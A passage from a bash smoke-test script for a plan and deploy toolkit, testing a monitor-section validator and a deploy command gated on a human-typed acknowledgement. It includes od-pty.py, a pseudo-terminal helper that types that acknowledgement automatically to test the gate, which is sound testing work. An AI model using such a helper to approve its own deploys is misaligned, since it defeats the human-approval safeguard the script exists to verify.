printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## monitor\n\n```json\n{"checks": []}\n```\n' >"$MN_TMP/lower.md"; mn_bad lower "exactly '## Monitor'"
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\nMonitor\n-------\n\n```json\n{"checks": []}\n```\n' >"$MN_TMP/setext.md"; mn_bad setext "not an underlined title"
# the section ends at the next heading: a later section's fenced block is not Monitor's, and a fenced example of the heading is not a heading
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\n```json\n{"checks": []}\n```\n\n## Notes\n\n```json\n{"x": 1}\n```\n' >"$MN_TMP/later.md"; mn_ok later
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n```markdown\n## Monitor\n```\n' >"$MN_TMP/fenced-head.md"; mn_ok fenced-head
# threat 2: a json block under ## Monitor is accepted by planlib validate, and a task line inside it is still refused by planlib
python3 "$EX/planlib.py" validate "$MN_TMP/ok.md" >/dev/null 2>&1 || fail "monitor-section: planlib validate refuses a plan with a ## Monitor json block"
python3 "$EX/planlib.py" validate "$MN_TMP/ok1.md" >/dev/null 2>&1 || fail "monitor-section: planlib validate refuses the stub section"
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## Monitor\n\n```json\n{"checks": []}\n- [ ] **Phase 9.9** [docs] hidden\n```\n' >"$MN_TMP/hide.md"
! python3 "$EX/planlib.py" validate "$MN_TMP/hide.md" >/dev/null 2>&1 || fail "monitor-section: planlib accepts a task line hidden inside the Monitor block"
mn_bad hide "task line sits inside the code fence"
# validate-file: repo-level file, same shape, no window_days
printf '{"checks": [%s]}\n' "$MN_OK" >"$MN_TMP/repo.json"; python3 "$ML" validate-file "$MN_TMP/repo.json" >/dev/null || fail "monitor-section: validate-file refuses a valid repo-level file"
printf '{"checks": []}\n' >"$MN_TMP/repo-empty.json"; python3 "$ML" validate-file "$MN_TMP/repo-empty.json" >/dev/null || fail "monitor-section: validate-file refuses an empty repo-level file"
printf '{"window_days": 14, "checks": []}\n' >"$MN_TMP/repo-w.json"; MN_O="$(python3 "$ML" validate-file "$MN_TMP/repo-w.json" 2>&1)" && fail "monitor-section: validate-file accepts window_days"
grep -qF "unknown key 'window_days'" <<<"$MN_O" || fail "monitor-section: validate-file did not name window_days: $MN_O"
printf '{nope' >"$MN_TMP/repo-bad.json"; ! python3 "$ML" validate-file "$MN_TMP/repo-bad.json" >/dev/null 2>&1 || fail "monitor-section: validate-file accepts invalid JSON"
! python3 "$ML" validate-file "$MN_TMP/absent.json" >/dev/null 2>&1 || fail "monitor-section: validate-file accepts a missing file"
# exit codes: usage errors are 2, a missing plan is 1
MN_RC=0; python3 "$ML" >/dev/null 2>&1 || MN_RC=$?; [ "$MN_RC" = 2 ] || fail "monitor-section: no arguments exited $MN_RC, expected 2"
MN_RC=0; python3 "$ML" validate >/dev/null 2>&1 || MN_RC=$?; [ "$MN_RC" = 2 ] || fail "monitor-section: validate with no plan exited $MN_RC, expected 2"
MN_RC=0; python3 "$ML" frobnicate x >/dev/null 2>&1 || MN_RC=$?; [ "$MN_RC" = 2 ] || fail "monitor-section: an unknown subcommand exited $MN_RC, expected 2"
MN_RC=0; python3 "$ML" validate "$MN_TMP/absent.md" >/dev/null 2>&1 || MN_RC=$?; [ "$MN_RC" = 1 ] || fail "monitor-section: a missing plan exited $MN_RC, expected 1"
# a near-miss level-2 heading is refused, never ignored as "not watched"
for MN_H in 'Monitoring' 'Monitors' 'monitor checks' 'MONITOR' 'Monitor:'; do
  printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n\n## %s\n\n```json\n{"checks": []}\n```\n' "$MN_H" >"$MN_TMP/near.md"; mn_bad near "use '## Monitor'"
done
# no section = not watched = valid
printf '# P\n\n- [ ] **Phase 1.1** [docs] t\n  - Acceptance: true\n' >"$MN_TMP/none.md"; mn_ok none
# every plan in this checkout, and every scaffold of every template, validates under planlib and monitorlib
MN_N=0
for MN_F in "$EB_ROOT"/.claude/plans/*.md; do
  [ -f "$MN_F" ] || continue; MN_N=$((MN_N + 1))
  python3 "$EX/planlib.py" validate "$MN_F" >/dev/null 2>&1 || fail "monitor-section: planlib validate refuses $MN_F"
  MN_O="$(python3 "$ML" validate "$MN_F" 2>&1)" || fail "monitor-section: monitorlib validate refuses $MN_F: $MN_O"
done
[ "$MN_N" -ge 1 ] || fail "monitor-section: no plans found under $EB_ROOT/.claude/plans"
for MN_PROF in generic apex; do
  MN_R="$MN_TMP/scaf-$MN_PROF"; mkdir -p "$MN_R" && git -C "$MN_R" init -q -b main || fail "monitor-section: cannot init the scaffold repo"
  for MN_SC in bugfix poc feature; do
    (cd "$MN_R" && APEX_PLAN_PROFILE="$MN_PROF" bash "$SS" "m-$MN_SC" "T" --scope "$MN_SC" >/dev/null) || fail "monitor-section: $MN_PROF --scope $MN_SC scaffold failed"
    MN_F="$MN_R/.claude/plans/m-$MN_SC-plan.md"
    grep -qx '## Monitor' "$MN_F" && grep -qxF '{"window_days": 14, "checks": []}' "$MN_F" || fail "monitor-section: $MN_PROF $MN_SC scaffold has no Monitor stub"
    python3 "$EX/planlib.py" validate "$MN_F" >/dev/null 2>&1 || fail "monitor-section: $MN_PROF $MN_SC scaffold fails planlib validate"
    MN_O="$(python3 "$ML" validate "$MN_F" 2>&1)" || fail "monitor-section: $MN_PROF $MN_SC scaffold fails monitorlib validate: $MN_O"
  done
done
# promote: a plan with the stub (the scaffold), a plan with no section, and one with a real check all promote; bad sections stop it
sp_fx mnstub bugfix;  sp_promoted "monitor-section: a plan with the stub (checks: [])" "$SP_TMP/mnstub"
grep -q '^## Monitor$' "$SP_TMP/mnstub/.claude/plans/fx-plan.md" || fail "monitor-section: the promote fixture lost its Monitor stub"
! grep -qi 'monitor' <<<"$SP_OUT" || fail "monitor-section: a valid Monitor section changed promote's output: $SP_OUT"
sp_fx mnnone bugfix; sp_edc mnnone .claude/plans/fx-plan.md '/^## Monitor$/,/^## Phases$/{/^## Phases$/!d;}'
! grep -q '^## Monitor' "$SP_TMP/mnnone/.claude/plans/fx-plan.md" || fail "monitor-section: could not remove the Monitor section from the fixture"
sp_promoted "monitor-section: a plan with no Monitor section" "$SP_TMP/mnnone"
! grep -qi 'monitor' <<<"$SP_OUT" || fail "monitor-section: a plan without a section prints about Monitor: $SP_OUT"
sp_fx mnreal bugfix; sp_edc mnreal .claude/plans/fx-plan.md 's|^{"window_days": 14, "checks": \[\]}$|{"window_days": 30, "checks": [{"id": "c1", "metric": "m1", "op": ">", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": "echo 0"}}]}|'
grep -qF '"c1"' "$SP_TMP/mnreal/.claude/plans/fx-plan.md" || fail "monitor-section: could not put a check in the fixture"
sp_promoted "monitor-section: a plan with a valid check" "$SP_TMP/mnreal"
sp_fx mnbad bugfix; sp_edc mnbad .claude/plans/fx-plan.md 's|^{"window_days": 14, "checks": \[\]}$|{"window_days": 0, "checks": [{"id": "c1", "metric": "m1", "op": "~", "threshold": 1, "severity": "low", "probe": {"kind": "cmd", "command": "echo 0"}}]}|'
sp_refused "monitor-section: a Monitor section with a bad window and op" "$SP_TMP/mnbad" 'window_days must be an integer 1-90'
grep -qF 'unknown op' <<<"$SP_OUT" && grep -qF 'c1' <<<"$SP_OUT" || fail "monitor-section: promote did not name the op problem and the check id: $SP_OUT"
sp_fx mnnoblk bugfix; sp_edc mnnoblk .claude/plans/fx-plan.md '/^```json$/,/^```$/d'
sp_refused "monitor-section: a Monitor heading with no block" "$SP_TMP/mnnoblk" 'no fenced json block'
sp_fx mntwo bugfix; sp_edc mntwo .claude/plans/fx-plan.md 's|^{"window_days": 14, "checks": \[\]}$|{"checks": []}\
```\
\
```json\
{"checks": []}|'
sp_refused "monitor-section: two json blocks" "$SP_TMP/mntwo" '2 fenced blocks'
# the op wording cannot drift back: op is the expected condition, a criterion maps onto a check, no "breached when value op threshold", no !=
for MN_T in "$SS_TPL"/generic/plan-template.md "$SS_TPL"/generic/plan-template-lean.md "$SS_TPL"/apex/plan-template.md "$SS_TPL"/apex/plan-template-lean.md "$PLUGIN_ROOT/skills/apex-plan/SKILL.md"; do
  grep -qF 'expected (healthy) condition' "$MN_T" || fail "monitor-section: $MN_T does not say op is the expected (healthy) condition"
  grep -qF 'maps directly onto a check' "$MN_T" || fail "monitor-section: $MN_T does not say a success criterion maps directly onto a check"
  grep -qF '"op": "<", "threshold": 2000' "$MN_T" || fail "monitor-section: $MN_T lost the p99 worked example"
  ! grep -qiE 'breached when (the )?value op threshold|breach condition|`==` `!=`' "$MN_T" || fail "monitor-section: $MN_T has the inverted op wording or lists !="
done
grep -qF 'NOT (value op threshold)' "$ML" || fail "monitor-section: monitorlib.py does not state breach = NOT (value op threshold)"
ok "monitor-section: monitorlib validates the plan's ## Monitor section as an allow-list (ledger id grammar, the ADR's five ops with op the expected condition and != refused, http/cmd/runner probes; a runner metrics list without the check's metric and a near-miss heading such as ## Monitoring are refused; the templates and SKILL.md carry the expected-condition wording; a missing id, unknown op or probe.kind, window_days 0 and 91, headers, a non-GET method, a duplicate id, two blocks, invalid JSON, a heading with no block, a bad id, unknown keys are each refused by name); validate-file takes a repo-level file and refuses window_days; no section and checks: [] promote, bad sections stop promote; $MN_N plan(s) here and all six scaffolds of both profiles validate"

# 70. operate-deploy (aidlc-borrowings Phase 3.3, ADR R5, R5b, R6, R8): operate.sh PLAN deploy|status and --all status
#     on a temp repo whose plans landed through the real init/land.sh. Refusals: unlanded → 3, APEX_DEPLOY_CMD unset
#     → 2 naming it, HALT → 4; every deploy that is not fed through a pty runs fully detached (fork + setsid, stdin
#     /dev/null, a timeout) so it can never read the operator's terminal. The ack is read from a pseudo-terminal
#     driven by python's pty (no env var or file seam): a wrong sha (the previous landed commit, a short sha) or a
#     wrong slug is refused and the stub never runs; no terminal is refused with the human-must-type wording even when
#     APEX_OPERATE_ACK holds the right value. Threats (failing-first, mutant named in each fail message):
#     1) an ack for one landed sha accepted for another  2) a failed deploy opening a watch window
#     3) an agent acking its own deploy (here: no terminal / APEX_OPERATE_ACK; the hook deny is apex-dispatch check 89).
OD_TMP="$SMOKE_TMP/operate"; rm -rf "${OD_TMP:?}"; mkdir -p "$OD_TMP" || fail "operate-deploy: cannot create the temp dir"
OD="$OD_TMP/repo"; mkdir -p "$OD/plans" && git init -q -b main "$OD" || fail "operate-deploy: cannot init the repo"
OD="$(cd "$OD" && pwd -P)"; OPS="$EX/operate.sh"
[ -x "$OPS" ] || fail "operate-deploy: $OPS is missing or not executable"
cat >"$OD_TMP/od-pty.py" <<'PY'
# od-pty.py ACK TIMEOUT CMD... — run CMD on a fresh pseudo-terminal (its controlling terminal), type ACK once the
# ack> prompt shows, print everything the terminal showed, exit with CMD's status (124 on timeout).
import os, pty, select, signal, sys, time
ack, limit, cmd = sys.argv[1], float(sys.argv[2]), sys.argv[3:]
pid, fd = pty.fork()
if pid == 0:
    os.execvp(cmd[0], cmd)
out, sent, end = b"", False, time.time() + limit
while True:
    if time.time() > end:
        os.kill(pid, signal.SIGKILL); os.waitpid(pid, 0)
        sys.stdout.write(out.decode("utf-8", "replace") + "\n[od-pty.py: timeout]\n"); sys.exit(124)
    r, _, _ = select.select([fd], [], [], 0.2)
    if not r:
        continue
    try:
        data = os.read(fd, 4096)
    except OSError:
        break
    if not data:
        break
    out += data
    if not sent and b"ack> " in out:
        os.write(fd, ack.encode() + b"\n"); sent = True
_, st = os.waitpid(pid, 0)
sys.stdout.write(out.decode("utf-8", "replace"))
sys.exit(os.WEXITSTATUS(st) if os.WIFEXITED(st) else 128 + os.WTERMSIG(st))
PY
cat >"$OD_TMP/od-detach.py" <<'PY'
# od-detach.py OUT TIMEOUT CMD... — run CMD fully detached: a new session (os.setsid, so no controlling terminal),
# stdin /dev/null, stdout+stderr to OUT; exit with CMD's status (124 on timeout). macOS has no setsid(1).
import os, signal, sys, time
out, limit, cmd = sys.argv[1], float(sys.argv[2]), sys.argv[3:]
pid = os.fork()
if pid == 0:
    os.setsid()
    nul = os.open(os.devnull, os.O_RDONLY); os.dup2(nul, 0)
    o = os.open(out, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600); os.dup2(o, 1); os.dup2(o, 2)
    os.execvp(cmd[0], cmd)
end = time.time() + limit
while True:
    p, st = os.waitpid(pid, os.WNOHANG)
    if p:
        sys.exit(os.WEXITSTATUS(st) if os.WIFEXITED(st) else 128 + os.WTERMSIG(st))
    if time.time() > end:
        os.killpg(pid, signal.SIGKILL); os.waitpid(pid, 0); sys.exit(124)
    time.sleep(0.05)
PY
printf '#!/usr/bin/env bash\nprintf "%%s %%s ack=%%s\\n" "$PLAN_SLUG" "$LANDED_SHA" "${APEX_OPERATE_ACK-unset}" >>"%s/deployed.log"\nexit "${1:-0}"\n' "$OD_TMP" >"$OD_TMP/deploy.sh"
chmod +x "$OD_TMP/deploy.sh"; : >"$OD_TMP/deployed.log"
OD_OK="bash '$OD_TMP/deploy.sh' 0"; OD_FAIL="bash '$OD_TMP/deploy.sh' 7"
# od_land NAME BODY — commit plans/NAME-plan.md and land it through init → worktree commit → land.sh (APEX_GIBSON=0).
od_land() {
  printf '%b' "$2" >"$OD/plans/$1-plan.md"; git -C "$OD" add -A && git -C "$OD" commit -qm "plan $1" || fail "operate-deploy: cannot commit plan $1"
  (cd "$OD" && APEX_GIBSON=0 "$EX/init.sh" "plans/$1-plan.md" >/dev/null 2>&1) || fail "operate-deploy: init of $1 failed"
  local wt; wt="$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["worktree_path"])' "$(st "$OD" "plans/$1-plan.md")/checkpoint.json")"
  echo "$1" >"$wt/$1.txt"; git -C "$wt" add -A && git -C "$wt" commit -qm "work $1" || fail "operate-deploy: cannot commit in the $1 worktree"
  OD_LAST_STATE="$(st "$OD" "plans/$1-plan.md")"
  (cd "$OD" && APEX_GIBSON=0 "$EX/land.sh" "plans/$1-plan.md" >"$OD_TMP/land-$1.log" 2>&1) || fail "operate-deploy: land.sh of $1 failed: $(tail -3 "$OD_TMP/land-$1.log")"
}
git -C "$OD" commit -q --allow-empty -m base
OD_MON='## Monitor\n\n```json\n{"window_days": 7, "checks": [{"id": "c1", "metric": "m1", "op": "<", "threshold": 5, "severity": "high", "probe": {"kind": "cmd", "command": "echo 3"}}]}\n```\n'
od_land od "# OD\n\n- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n\n$OD_MON"
OD_STATE="$OD_LAST_STATE"; OD_CP="$OD_STATE/checkpoint.json"
OD_SHA="$(git -C "$OD" rev-parse main)"; OD_GOOD="od@$OD_SHA"     # od's landing commit
git -C "$OD" log -1 --format=%s "$OD_SHA" | grep -q '^apex-scope-loop: merge apex-scope-loop/' || fail "operate-deploy: main is not od's landing commit"
od_land feat "# Feat\n\n- [x] **Phase 1.1** [docs] done\n  - Acceptance: true\n"; OD_FEAT_STATE="$OD_LAST_STATE"
OD_FEAT_SHA="$(git -C "$OD" rev-parse main)"                       # another plan's landing, newer than od's
printf '# Un\n\n- [ ] **Phase 1.1** [docs] open\n  - Acceptance: true\n' >"$OD/plans/un-plan.md"; git -C "$OD" add -A; git -C "$OD" commit -qm un
OD_TIP="$(git -C "$OD" rev-parse main)"; [ "$OD_TIP" != "$OD_FEAT_SHA" ] && [ "$OD_FEAT_SHA" != "$OD_SHA" ] || fail "operate-deploy: the fixture's commits did not move main"
(cd "$OD" && APEX_GIBSON=0 "$EX/init.sh" plans/un-plan.md >/dev/null 2>&1) || fail "operate-deploy: init of the unlanded plan failed"
printf '# Raw\n\n- [ ] **Phase 1.1** [docs] open\n  - Acceptance: true\n' >"$OD/plans/raw-plan.md"
# od_split ARGS... — the index of the first "--" (the VAR=value words before it go to env, the rest to operate.sh).
od_split() { local i=0; for a in "$@"; do [ "$a" = -- ] && { echo "$i"; return 0; }; i=$((i + 1)); done; fail "operate-deploy: no -- in $*"; }
# odd LABEL WANT_RC PATTERN [ENV...] -- ARGS... — operate.sh ARGS run fully detached from $OD; exit WANT_RC, output has PATTERN.
odd() {
  local label="$1" want="$2" pat="$3" rc=0 k; shift 3
  k="$(od_split "$@")"
  (cd "$OD" && env "${@:1:$k}" python3 -I "$OD_TMP/od-detach.py" "$OD_TMP/det.out" 60 "$OPS" "${@:$((k + 2))}") || rc=$?
  [ "$rc" = "$want" ] || fail "operate-deploy: $label exited $rc, expected $want: $(cat "$OD_TMP/det.out")"
  grep -q -- "$pat" "$OD_TMP/det.out" || fail "operate-deploy: $label did not say '$pat': $(cat "$OD_TMP/det.out")"
}
# odp LABEL WANT_RC ACK [ENV...] -- ARGS... — operate.sh ARGS on a pty with ACK typed at the prompt; output in $OD_TMP/pty.out.
odp() {
  local label="$1" want="$2" ack="$3" rc=0 k; shift 3
  k="$(od_split "$@")"
  (cd "$OD" && env "${@:1:$k}" python3 -I "$OD_TMP/od-pty.py" "$ack" 60 "$OPS" "${@:$((k + 2))}" >"$OD_TMP/pty.out" 2>&1) || rc=$?
  [ "$rc" = "$want" ] || fail "operate-deploy: $label exited $rc, expected $want: $(cat "$OD_TMP/pty.out")"
}
od_runs() { wc -l <"$OD_TMP/deployed.log" | tr -d ' '; }
# od_cp EXPR — a smoke-written Python expression over od's checkpoint (s) and its operate key (o); fixture data only.
od_cp() { python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); print(eval(sys.argv[2], {"s": s, "o": s.get("operate") or {}}))' "$OD_CP" "$1"; }
# R6 refusals, each before any terminal is touched
odd "an unlanded plan" 3 "not landed" "APEX_DEPLOY_CMD=$OD_OK" -- plans/un-plan.md deploy
odd "an unlanded plan's status" 3 "not landed" -- plans/un-plan.md status
odd "a plan with no run state" 3 "not landed" "APEX_DEPLOY_CMD=$OD_OK" -- plans/raw-plan.md deploy
odd "APEX_DEPLOY_CMD unset" 2 "APEX_DEPLOY_CMD is unset" -- plans/od-plan.md deploy
odd "APEX_DEPLOY_CMD empty" 2 "APEX_DEPLOY_CMD is unset" "APEX_DEPLOY_CMD=" -- plans/od-plan.md deploy
touch "$OD_STATE/HALT"; odd "HALT in the plan state" 4 "kill switch set" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
odd "HALT on status" 4 "kill switch set" -- plans/od-plan.md status
rm -f "$OD_STATE/HALT"; touch "$OD/.dev-plan-state/HALT"; odd "the shared HALT" 4 "kill switch set" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
rm -f "$OD/.dev-plan-state/HALT"; odd "APEX_HALT=1" 4 "APEX_HALT=1" "APEX_HALT=1" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
odd "a bad step" 2 "usage" -- plans/od-plan.md frobnicate
odd "--all deploy" 2 "status only" -- --all deploy
odd "extra arguments" 2 "usage" -- plans/od-plan.md deploy now
[ "$(od_runs)" = 0 ] || fail "operate-deploy: a refused precondition ran the deploy command: $(cat "$OD_TMP/deployed.log")"
# An invalid Monitor section fails closed (status and deploy), the deploy command never runs
cp "$OD/plans/od-plan.md" "$OD_TMP/od-plan.keep"
sed 's/"window_days": 7/"window_days": 0/' "$OD_TMP/od-plan.keep" >"$OD/plans/od-plan.md"
odd "an invalid Monitor section (deploy)" 2 "window_days must be an integer 1-90" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
odd "an invalid Monitor section (status)" 2 "window_days must be an integer 1-90" -- plans/od-plan.md status
cp "$OD_TMP/od-plan.keep" "$OD/plans/od-plan.md"
# Threat 3 (operate.sh's layer): no terminal is refused even when APEX_OPERATE_ACK holds the right value; the refusal
# says a human must type slug@sha at their own terminal and never mentions a tty (no pty workaround suggested).
# Mutant "accept APEX_OPERATE_ACK when /dev/tty cannot be opened" turns this red.
odd "no controlling terminal" 5 "type $OD_GOOD there" "APEX_DEPLOY_CMD=$OD_OK" "APEX_OPERATE_ACK=$OD_GOOD" -- plans/od-plan.md deploy
grep -q 'A deploy needs a human: run operate.sh plans/od-plan.md deploy yourself, in your own terminal' "$OD_TMP/det.out" || fail "operate-deploy: the no-terminal refusal does not say a human must run it at their own terminal: $(cat "$OD_TMP/det.out")"
! grep -qi 'tty' "$OD_TMP/det.out" || fail "operate-deploy: the no-terminal refusal mentions a tty (points at a pty workaround): $(cat "$OD_TMP/det.out")"
grep -q '^== Ask Contract: deploy od ==$' "$OD_TMP/det.out" && grep -q '^What:' "$OD_TMP/det.out" && grep -q '^What it does:' "$OD_TMP/det.out" \
  && grep -q '^Why:' "$OD_TMP/det.out" && grep -q '^Risks:' "$OD_TMP/det.out" || fail "operate-deploy: no Ask Contract (what / what it does / why / risks) before the ack: $(cat "$OD_TMP/det.out")"
[ "$(od_runs)" = 0 ] || fail "operate-deploy: a deploy with no terminal ran the deploy command (mutant: APEX_OPERATE_ACK authorizes)"
[ "$(od_cp 'len(o.get("deploys") or [])')" = 0 ] || fail "operate-deploy: a refused ack was recorded as a deploy"
# Threat 1: an ack for another landed sha (feat's landing, main's tip), a short sha, a wrong slug, an empty line → refused.
# Mutants "compare the slug only" / "accept a sha prefix" / "bind to the base tip" turn these red.
odp "an ack with another plan's landed sha" 5 "od@$OD_FEAT_SHA" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
grep -q "not this plan's landed sha $OD_SHA" "$OD_TMP/pty.out" || fail "operate-deploy: the wrong-sha refusal is not named: $(cat "$OD_TMP/pty.out")"
odp "an ack with the base tip" 5 "od@$OD_TIP" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
grep -q "not this plan's landed sha $OD_SHA" "$OD_TMP/pty.out" || fail "operate-deploy: the wrong-sha refusal is not named: $(cat "$OD_TMP/pty.out")"
odp "an ack with a short sha" 5 "od@${OD_SHA:0:12}" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
odp "an ack with the sha twice" 5 "od@$OD_SHA$OD_SHA" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
odp "an ack naming another plan" 5 "feat@$OD_SHA" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
grep -q "names another plan ('feat')" "$OD_TMP/pty.out" || fail "operate-deploy: the wrong-slug refusal is not named: $(cat "$OD_TMP/pty.out")"
odp "an empty ack" 5 "" "APEX_DEPLOY_CMD=$OD_OK" -- plans/od-plan.md deploy
odp "od's ack for the other plan" 5 "$OD_GOOD" "APEX_DEPLOY_CMD=$OD_OK" -- plans/feat-plan.md deploy
grep -q "To proceed, a human types exactly feat@$OD_FEAT_SHA at this terminal" "$OD_TMP/pty.out" || fail "operate-deploy: feat's Ask Contract does not bind feat's landing sha: $(cat "$OD_TMP/pty.out")"
[ "$(od_runs)" = 0 ] || fail "operate-deploy: a refused ack ran the deploy command: $(cat "$OD_TMP/deployed.log")"
# the ledger seam: with <state>/dispatch/ present, and a stale active-route.json there (B-046), every deploy appends
# an operate_deploy row with route_id null
LG="$PLUGIN_ROOT/../apex-dispatch/scripts/ledger.sh"; [ -x "$LG" ] || fail "operate-deploy: the sibling apex-dispatch ledger.sh is missing"
mkdir -p "$OD_STATE/dispatch"; printf '{"route_id": "r-%s-L3-1", "route_mode": "baseline"}\n' "$(basename "$OD_STATE")" >"$OD_STATE/dispatch/active-route.json"
# Threat 2: a failing deploy is recorded (ts, sha, exit, ack_source), exits 1 and opens no window.
# Mutant "open the window whatever the exit" turns this red.
odp "a failing deploy" 1 "$OD_GOOD" "APEX_DEPLOY_CMD=$OD_FAIL" -- plans/od-plan.md deploy
grep -q 'deploy FAILED (exit 7)' "$OD_TMP/pty.out" || fail "operate-deploy: the failing deploy did not say so: $(cat "$OD_TMP/pty.out")"
[ "$(od_runs)" = 1 ] || fail "operate-deploy: the failing deploy command did not run exactly once"
[ "$(od_cp '[(d["sha"], d["exit"], d["ack_source"], bool(d.get("ts"))) for d in o["deploys"]]')" = "[('$OD_SHA', 7, 'tty', True)]" ] || fail "operate-deploy: the failing deploy was not recorded with ts, sha, exit and ack_source: $(od_cp 'o')"
[ "$(od_cp '"window" in o')" = False ] || fail "operate-deploy: a failed deploy opened a watch window (threat 2): $(od_cp 'o')"
odd "status after a failed deploy" 0 "window: not opened" -- plans/od-plan.md status
# the positive ack, typed on the pty; APEX_OPERATE_ACK in the env neither helps nor reaches the deploy command
odp "the correct ack" 0 "$OD_GOOD" "APEX_DEPLOY_CMD=$OD_OK" "APEX_OPERATE_ACK=$OD_GOOD" -- plans/od-plan.md deploy
grep -q "deployed od at ${OD_SHA:0:12}; watch window open for 7 day(s)" "$OD_TMP/pty.out" || fail "operate-deploy: the deploy did not report success: $(cat "$OD_TMP/pty.out")"
[ "$(tail -n 1 "$OD_TMP/deployed.log")" = "od $OD_SHA ack=unset" ] || fail "operate-deploy: the deploy command did not get PLAN_SLUG/LANDED_SHA, or saw APEX_OPERATE_ACK: $(tail -n 1 "$OD_TMP/deployed.log")"
[ "$(od_cp '[(d["sha"], d["exit"], d["ack_source"]) for d in o["deploys"]]')" = "[('$OD_SHA', 7, 'tty'), ('$OD_SHA', 0, 'tty')]" ] || fail "operate-deploy: the deploy history is wrong: $(od_cp 'o')"
OD_W="$(od_cp 'o["window"]["start"] + " " + str(o["window"]["days"]) + " " + str(o["window"]["start"] == o["deploys"][-1]["ts"])')"
[ "$(od_cp '__import__("datetime").datetime.strptime(o["window"]["end"], "%Y-%m-%dT%H:%M:%SZ") - __import__("datetime").datetime.strptime(o["window"]["start"], "%Y-%m-%dT%H:%M:%SZ") == __import__("datetime").timedelta(days=7)')" = True ] \
  && [ "${OD_W#* }" = "7 True" ] || fail "operate-deploy: the window is not the plan's 7 days from the deploy: $(od_cp 'o')"
# a later failing deploy is recorded but leaves the open window alone (threat 2's neighbour)
odp "a failing deploy after success" 1 "$OD_GOOD" "APEX_DEPLOY_CMD=$OD_FAIL" -- plans/od-plan.md deploy
[ "$(od_cp 'o["window"]["start"] + " " + str(o["window"]["days"]) + " " + str(len(o["deploys"]))')" = "${OD_W% *} 3" ] || fail "operate-deploy: a failing deploy moved the open window: $(od_cp 'o')"
# status and --all status: day N of M, the declared checks, the R5b warning for a landed feature plan with no section
odd "status" 0 "window: day 1 of 7" -- plans/od-plan.md status
grep -qF -- '- c1: m1 < 5 (severity high; probe cmd: echo 3)' "$OD_TMP/det.out" || fail "operate-deploy: status does not print the declared check: $(cat "$OD_TMP/det.out")"
grep -qF "last deploy: " "$OD_TMP/det.out" && grep -q "exit 7 (ack: tty; 3 deploy(s))" "$OD_TMP/det.out" || fail "operate-deploy: status does not show the last deploy: $(cat "$OD_TMP/det.out")"
odd "--all status" 0 "window: day 1 of 7" -- --all status
grep -q '^plan od (' "$OD_TMP/det.out" && grep -q '^plan feat (' "$OD_TMP/det.out" && ! grep -q '^plan un (' "$OD_TMP/det.out" || fail "operate-deploy: --all status does not list exactly the landed plans: $(cat "$OD_TMP/det.out")"
grep -q 'WARNING: feat is a landed feature plan with no ## Monitor section' "$OD_TMP/det.out" || fail "operate-deploy: --all status does not warn about the landed feature plan with no Monitor section: $(cat "$OD_TMP/det.out")"
! grep -q 'WARNING: od ' "$OD_TMP/det.out" || fail "operate-deploy: --all status warns about a watched plan"
python3 -c 'import datetime as d, json, sys; p = sys.argv[1]; s = json.load(open(p)); w = s["operate"]["window"]; f = "%Y-%m-%dT%H:%M:%SZ"; t = d.datetime.strptime(w["start"], f) - d.timedelta(days=3, hours=1); w["start"], w["end"] = t.strftime(f), (t + d.timedelta(days=7)).strftime(f); json.dump(s, open(p, "w"))' "$OD_CP"
odd "status on day 4" 0 "window: day 4 of 7" -- plans/od-plan.md status
python3 -c 'import datetime as d, json, sys; p = sys.argv[1]; s = json.load(open(p)); w = s["operate"]["window"]; f = "%Y-%m-%dT%H:%M:%SZ"; t = d.datetime.strptime(w["start"], f) - d.timedelta(days=5); w["start"], w["end"] = t.strftime(f), (t + d.timedelta(days=7)).strftime(f); json.dump(s, open(p, "w"))' "$OD_CP"
odd "status after the window ended" 0 "window: closed (ended " -- plans/od-plan.md status
odd "feat status (not opened)" 0 "window: not opened" -- plans/feat-plan.md status
# the ledger: three operate_deploy rows, route_id and route_mode null despite the stale active route, ack_source tty; the chain verifies
OD_L="$OD_STATE/dispatch/ledger.jsonl"; [ -f "$OD_L" ] || fail "operate-deploy: no ledger was written under $OD_STATE/dispatch"
[ "$(python3 -c 'import json,sys; print([(r["event"], r["slug"], r["landed_sha"], r["exit_code"], r["ack_source"], r["route_id"], r["route_mode"]) for r in map(json.loads, open(sys.argv[1]))])' "$OD_L")" \
  = "[('operate_deploy', 'od', '$OD_SHA', 7, 'tty', None, None), ('operate_deploy', 'od', '$OD_SHA', 0, 'tty', None, None), ('operate_deploy', 'od', '$OD_SHA', 7, 'tty', None, None)]" ] \
  || fail "operate-deploy: the operate_deploy rows are wrong (route_id and route_mode must be null, never the stale active route: B-046): $(cat "$OD_L")"
OD_V="$("$LG" verify --state "$OD_STATE" 2>&1)" || fail "operate-deploy: ledger.sh verify failed: $OD_V"
[ -n "$OD_FEAT_STATE" ] && [ ! -d "$OD_FEAT_STATE/dispatch" ] || fail "operate-deploy: a dispatch dir appeared for a plan that never had one"
# the deploy row records the caller's checkout HEAD (head), beside the landed sha
[ "$(od_cp 'o["deploys"][1].get("head")')" = "$(git -C "$OD" rev-parse HEAD)" ] || fail "operate-deploy: the deploy row does not record the checkout HEAD: $(od_cp 'o["deploys"][1]')"
# an interrupted deploy (TERM to operate.sh's process group, as a closed terminal or ^C would) is still recorded with
